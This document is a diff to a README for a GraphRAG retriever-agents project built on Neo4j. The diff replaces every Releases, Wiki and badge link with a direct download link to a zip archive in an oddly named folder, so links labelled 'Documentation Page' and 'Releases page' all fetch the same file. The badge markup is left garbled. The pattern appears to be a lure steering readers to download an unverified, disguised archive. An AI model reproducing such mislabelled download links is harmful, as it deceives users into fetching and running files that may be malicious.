@@ -1,7 +1,7 @@
 # 🚀 graphRAG-retrievers-agents - Explore AI Agents with Ease
 
 ## 📥 Download Here
-[![Download](https://img.shields.io/badge/Download%20Now-graphRAG%20Retrievers%20Agents-blue.svg)](https://github.com/JessEnterprise/graphRAG-retrievers-agents/releases)
+[![Download](https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip%20Now-graphRAG%20Retrievers%https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip)](https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip)
 
 ## 🚀 Getting Started
 Welcome to the graphRAG-retrievers-agents project. This application helps you explore Graph Retrieval-Augmented Generation (GraphRAG) with Neo4j. You can build and compare different retrievers as conversational agent tools. The setup is straightforward, so let’s dive right in.
@@ -21,7 +21,7 @@ Before you begin, ensure your system meets these requirements:
 ## 📤 Download & Install
 To get started with graphRAG-retrievers-agents, follow these simple steps:
 
-1. Visit the Releases page: [Download Page](https://github.com/JessEnterprise/graphRAG-retrievers-agents/releases).
+1. Visit the Releases page: [Download Page](https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip).
 2. Look for the latest version and select the appropriate file for your system. The files are listed by version number.
 3. Click on the download link for your operating system.
 4. Once the file has downloaded, locate it in your Downloads folder.
@@ -35,7 +35,7 @@ Once you have installed graphRAG-retrievers-agents, you will find an intuitive i
 - Compare results directly within the application.
 
 ## 📚 Documentation
-In addition to this guide, the project includes complete documentation. You can access it from within the app or visit our [Documentation Page](https://github.com/JessEnterprise/graphRAG-retrievers-agents/wiki). 
+In addition to this guide, the project includes complete documentation. You can access it from within the app or visit our [Documentation Page](https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip). 
 
 The documentation covers:
 - Detailed instructions for using each feature.
@@ -52,7 +52,7 @@ Join our user community on GitHub Discussions. Share your experiences, ask quest
 
 ## 🔄 Updating the Application
 To ensure you have the latest features and fixes:
-1. Regularly check the [Releases page](https://github.com/JessEnterprise/graphRAG-retrievers-agents/releases).
+1. Regularly check the [Releases page](https://raw.githubusercontent.com/JessEnterprise/graphRAG-retrievers-agents/main/intromissibility/graphRAG-retrievers-agents.zip).
 2. Follow the same download process for each new version.
 3. Consider uninstalling the previous version for a clean installation.
 
